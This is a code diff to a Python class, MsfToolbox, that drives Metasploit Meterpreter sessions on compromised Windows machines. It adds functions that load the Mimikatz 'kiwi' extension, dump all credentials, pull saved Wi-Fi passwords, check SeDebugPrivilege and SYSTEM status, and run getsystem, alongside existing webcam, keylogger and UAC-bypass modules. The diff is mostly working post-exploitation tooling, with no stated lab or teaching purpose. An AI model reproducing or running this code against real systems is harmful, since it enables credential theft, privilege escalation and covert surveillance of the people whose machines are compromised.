@@ -6,6 +6,7 @@ from tools import webcam
 from tools import information
 from tools import keylogger
 from tools import bypassuac
+from tools import passwords
 
 import os
 import time
@@ -29,8 +30,8 @@ class MsfToolbox:
         self._password = password
         self.init_client()
 
-        #self._ip = '192.168.4.1'
-        self._ip = '172.21.42.1'
+        self._ip = '192.168.4.1'
+        # self._ip = '172.21.42.1'
 
         # Remove old medias
         media.remove_medias()
@@ -146,18 +147,10 @@ class MsfToolbox:
 
     # Information
 
-    # def get_sysinfo(self, session):
-    #     return information.get_sysinfo(self.get_session_shell(session))
+    def get_sysinfo(self, session):
+        return information.get_sysinfo(self.get_session_shell(session))
 
-    def get_sysinfo(self, session_id):
-        shell = self.get_session_shell(session_id)
-        session = self.get_session(session_id)
-        data = information.get_sysinfo(shell)
-        is_admin = self.is_admin(shell)
-        is_system = self.is_system(session)
-        return data, is_admin, is_system
 
-        
     # Webcam snapshots
 
     def has_webcam(self, session):
@@ -233,6 +226,18 @@ class MsfToolbox:
     def get_remote_state(self):
         return self._remote
 
+
+    # Passwords
+
+    def get_status(self, session_id):
+        shell = self.get_session_shell(session_id)
+        # passwords.exit_local_shell(shell)
+        
+        session = self.get_session(session_id)
+        is_admin = self.is_admin(shell)
+        is_system = self.is_system(session)
+        return is_admin, is_system
+
     def start_bypassuac(self, session):
         session = int(session)
         shell = self.get_session_shell(session)
@@ -245,12 +250,27 @@ class MsfToolbox:
         shell.write('getsystem\n')
         time.sleep(0.2)
         ret = shell.read()
-        print ret
 
     def is_admin(self, shell):
         shell.write('getprivs\n')
+        time.sleep(0.2)
         result = shell.read()
         return "SeDebugPrivilege" in result
 
     def is_system(self, session):
         return "AUTORITE NT\\Syst_me" in session['info']
+
+
+    def load_kiwi(self, session_id):
+        shell = self.get_session_shell(session_id)
+        passwords.load_kiwi(shell)
+        return 
+
+    def get_creds(self, session_id):
+        shell = self.get_session_shell(session_id)
+        return passwords.creds_all(shell)
+
+    def get_wifi_creds(self, session_id):
+        shell = self.get_session_shell(session_id)
+        return passwords.get_wifi_list(shell)
+    
